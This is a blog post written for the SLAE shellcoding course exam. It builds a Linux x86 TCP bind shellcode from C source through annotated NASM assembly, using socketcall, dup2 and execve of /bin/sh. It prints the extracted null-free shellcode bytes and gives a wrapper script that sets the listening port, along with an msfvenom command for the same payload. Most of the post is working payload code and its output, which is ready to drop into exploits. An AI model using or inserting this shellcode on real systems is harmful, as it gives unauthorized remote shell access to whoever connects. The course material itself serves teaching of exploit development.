---
layout: post
title:  "SLAE Assignment 1 - TCP Bind Shellcode"
date:   2017-04-13
categories: certification
---
<br />
Student **SLAE - 891**  
Github: [https://github.com/phackt/slae](https://github.com/phackt/slae)  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  

Hello everybody,  
  
Here we are for a new set of posts dealing with the exam of the great course [Assembly Language and Shellcoding on Linux](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/). Thanks to Vivek Ramachandran and his team for all of this work.  
  
For information, the SLAE course has been performed on a 32bits Kali environment:  
```bash
# uname -a
Linux kali 4.6.0-kali1-686 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) i686 GNU/Linux
```
  
We recommend to run the commands on a 32bits environment. Otherwise you should adapt them:  
```bash
nasm -f elf32 -o $1.o $1.nasm
ld -m elf_i386 -o $1 $1.o
gcc -fno-stack-protector -z execstack -m32 -o shellcode shellcode.c
```
  
So let's rumble!  
  
## Assignment 1:  
  
Code is available on my [github repo](https://github.com/phackt/slae/tree/master/assignment1).  
  
**Our Goal:**  
> *Create a Shell_Bind_TCP shellcode:*
 - *binds to a port that should be easily configurable*
 - *executes shell on incoming connection*
 - *easily configure the listening port*
  
If we want to create a TCP Bind shellcode from scratch, what are our options?:  

**1)** The lazy one; creating a shellcode thanks to msfvenom  
```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=8080 EXITFUNC=THREAD -f raw | ndisasm -u -
```

But it is quite too easy.  
  
**2)** Creating our own ELF thanks to a C program that will help to understand how the final shellcode will work.  
  
We will choose this last option.  
  
Here is our C source code:  
```c
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
int main(void)
{
        int clientfd, sockfd;
        int dstport = 8080;
        struct sockaddr_in mysockaddr;
 
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
        mysockaddr.sin_family = AF_INET; //2
        mysockaddr.sin_port = htons(dstport); //8080
        mysockaddr.sin_addr.s_addr = INADDR_ANY; //0
 
        bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
 
        listen(sockfd, 0);
 
        clientfd = accept(sockfd, NULL, NULL);
 
        dup2(clientfd, 0);
        dup2(clientfd, 1);
        dup2(clientfd, 2);
 
        execve("/bin/sh", NULL, NULL);
        return 0;
}
```  
  
Let's test it:  
```bash
gcc -fno-stack-protector -z execstack -ggdb -o shell-bind-tcp shell-bind-tcp.c
./shell-bind-tcp


```  
  
From another shell:  
![image1]({{ site.url }}/public/images/slae/assignment1/image1.png)  

The ```objdump -d ./shell-bind-tcp -M intel``` produces a huge amount of assembly code.  
Something good to notice is that our ELF has been dynamically linked:  
![image3]({{ site.url }}/public/images/slae/assignment1/image3.png)  
  
The ELF is using the .plt and .got sections in order to dynamically address the interesting functions.  
These functions are LIBC functions:  
![image2]({{ site.url }}/public/images/slae/assignment1/image2.png)  
  
We will need to translate these function calls into system calls. Let's focus on the following functions:   
``` 
socket
bind
listen
accept
dup2
execve
```
  
Let's have a look in **/usr/include/i386-linux-gnu/asm/unistd_32.h**:  
```
#define __NR_execve 11
#define __NR_dup2 63
#define __NR_socketcall 102
```

What is the syscall socketcall?  
```bash
man 2 socketcall

SOCKETCALL(2)                                             Linux Programmer's Manual                                            SOCKETCALL(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is  a  common  kernel  entry point for the socket system calls.  call determines which socket function to invoke.  args
       points to a block containing the actual arguments, which are passed through to the appropriate call.

       User programs should call the appropriate functions by their usual names.  Only standard library implementors and kernel hackers need
       to know about socketcall().
...
```  
  
Let's check the different values of the first **int call** argument:  
```bash
grep SYS_ /usr/include/linux/net.h 
#define SYS_SOCKET   1             /* sys_socket(2)            */
#define SYS_BIND     2             /* sys_bind(2)              */
#define SYS_CONNECT  3             /* sys_connect(2)           */
#define SYS_LISTEN   4             /* sys_listen(2)            */
#define SYS_ACCEPT   5             /* sys_accept(2)            */
#define SYS_GETSOCKNAME     6      /* sys_getsockname(2)       */
#define SYS_GETPEERNAME     7      /* sys_getpeername(2)       */
#define SYS_SOCKETPAIR      8      /* sys_socketpair(2)        */
#define SYS_SEND     9             /* sys_send(2)              */
#define SYS_RECV     10            /* sys_recv(2)              */
#define SYS_SENDTO   11            /* sys_sendto(2)            */
#define SYS_RECVFROM 12            /* sys_recvfrom(2)          */
#define SYS_SHUTDOWN 13            /* sys_shutdown(2)          */
#define SYS_SETSOCKOPT      14     /* sys_setsockopt(2)        */
#define SYS_GETSOCKOPT      15     /* sys_getsockopt(2)        */
#define SYS_SENDMSG  16            /* sys_sendmsg(2)           */
#define SYS_RECVMSG  17            /* sys_recvmsg(2)           */
#define SYS_ACCEPT4  18            /* sys_accept4(2)           */
#define SYS_RECVMMSG 19            /* sys_recvmmsg(2)          */
#define SYS_SENDMMSG 20            /* sys_sendmmsg(2)          */
```
  
So let's dive into our shellcode:  
```nasm
; shell_bind_tcp.nasm
; 
; A TCP port bind shellcode
;
; Author: SLAE - 891
;
; You are free to use and/or redistribute it without restriction

global _start

section       .text
_start:

; sockfd = socket(AF_INET, SOCK_STREAM, 0);
; int socketcall(int call, unsigned long *args);
; #define __NR_socketcall   102
; #define SYS_SOCKET        1
       xor ebx,ebx
       mul ebx              ; zero out eax and edx
       mov al, 102          ; __NR_socketcall
       mov bl, 1            ; SYS_SOCKET
       
       ; we are pushing on the stack our arguments
       push edx             ; IPPROTO_IP
       push byte 1          ; SOCK_STREAM
       push byte 2          ; AF_INET
       
       mov ecx, esp         ; the top of the stack points to a structure of 3 arguments
       int 0x80             ; syscall - result is stored in eax
       mov edi, eax         ; stores sockfd

; bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
; int socketcall(int call, unsigned long *args);
; #define __NR_socketcall   102
; #define SYS_BIND                 2
       push edx             ; mysockaddr.sin_addr.s_addr = INADDR_ANY; //0 - listen on 0.0.0.0 (all interfaces)
       push word 0x901f     ; mysockaddr.sin_port = htons(dstport); //8080
       push word 2          ; AF_INET
       mov ebx, esp         ; stores the address of mysockaddr
       push byte 16         ; length of mysockaddr
       push ebx             ; pointer to mysockaddr
       push edi             ; sockfd

       xor ebx, ebx         ; flushing registers
       mul ebx
       mov al, 102          ; __NR_socketcall
       mov bl, 2            ; SYS_BIND
       mov ecx, esp         ; pointer to the args for socketcall
       int 0x80


; listen(sockfd, 0);
; int socketcall(int call, unsigned long *args);
; #define __NR_socketcall   102
; #define SYS_LISTEN        4
       push edx             ; 0
       push edi             ; sockfd
       xor ebx, ebx         ; flushing registers
       mul ebx
       mov al, 102          ; __NR_socketcall
       mov bl, 4            ; SYS_LISTEN
       mov ecx, esp         ; pointer to the args for socketcall
       int 0x80 


; clientfd = accept(sockfd, NULL, NULL);
; int socketcall(int call, unsigned long *args);
; #define __NR_socketcall   102
; #define SYS_ACCEPT        5
       xor ebx, ebx         ; flushing registers
       mul ebx

       push edx             ; NULL
       push edx             ; NULL
       push edi             ; sockfd

       mov al, 102          ; __NR_socketcall
       mov bl, 5            ; SYS_ACCEPT
       mov ecx, esp         ; pointer to args
       int 0x80             ; returns clientfd file descriptor in eax

; int dup2(int oldfd, int newfd); duplicates a file descriptor
; dup2(clientfd, 0); 
; dup2(clientfd, 1);
; dup2(clientfd, 2);
; #define __NR_dup2 63

       mov ebx, eax         ; clientfd as first argument
       xor ecx, ecx
       mov cl, 2            ; 2 for stderr / 1 for stdout / 0 for stdin
       xor eax, eax

dup2:
       mov al, 63           ; __NR_dup2
       int 0x80
       dec ecx
       jns dup2             ; jump short if not signed 

; execve("/bin/sh", NULL, NULL);
; #define __NR_execve 11

       xor eax,eax
       push eax
       push 0x68732f2f      ; hs// - take care to the little endian representation
       push 0x6e69622f      ; nib/
       mov ebx, esp         ; pointer to command string
       mov ecx, eax
       mov edx, eax
       mov al, 11           ; __NR_execve
       int 0x80
```

Let's compile with the [compile.sh](https://github.com/phackt/slae/blob/master/assignment1/compile.sh) script:  
```bash
./compile.sh shell_bind_tcp
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```
  
Let's run shell_bind_tcp and try to connect from another shell:  
![image4]({{ site.url }}/public/images/slae/assignment1/image4.png)  
  
What we have to take care in shellcodes are bad characters. Each compromised application will lead to its own set of bad characters that we will need to avoid in the shellcode part of the exploit.    
Right now let's check that our shellcode do not contain null bytes:  
```bash
objdump -d shell_bind_tcp -M intel | grep 00
```
  
Great, no null bytes. Let's dump our shellcode:  
```bash
objdump -d ./shell_bind_tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x66\x68\x1f\x90\x66\x6a\x02\x89\xe3\x6a\x10\x53\x57\x31\xdb\xf7\xe3\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x52\x57\x31\xdb\xf7\xe3\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x31\xdb\xf7\xe3\x52\x52\x57\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
```
  
Let's execute it in [shellcode.c](https://github.com/phackt/slae/blob/master/assignment1/shellcode.c):  
```bash
gcc -fno-stack-protector -z execstack -o shellcode shellcode.c && ./shellcode
```
  
Then from another shell:  
![image5]({{ site.url }}/public/images/slae/assignment1/image5.png)  
  
One easy way to customize the listening port is to set a pattern in the source file and to generate the shellcode thanks to a wrapper script.  
We are creating a shell_bind_tcp.template and updating the following part:  
```push word 0x901f``` becomes ```push word PORT```.  
  
Now we will use the [wrapper.sh](https://github.com/phackt/slae/blob/master/assignment1/wrapper.sh) script:  
```bash
./wrapper.sh
Usage: ./wrapper.sh <port_number> <pattern> <file>
```
```bash
./wrapper.sh 8080 PORT ./shell_bind_tcp.template 
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x66\x68\x1f\x90\x66\x6a\x02\x89\xe3\x6a\x10\x53\x57\x31\xdb\xf7\xe3\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x52\x57\x31\xdb\xf7\xe3\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x31\xdb\xf7\xe3\x52\x52\x57\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
```  

So now we can parametrize the port number and generate a TCP port binding shellcode.  
  
Hope you enjoyed,  
Thanks a lot and as i'm used to saying, do not hesitate to comment and share.  
  
[Phackt](https://twitter.com/phackt_ul)

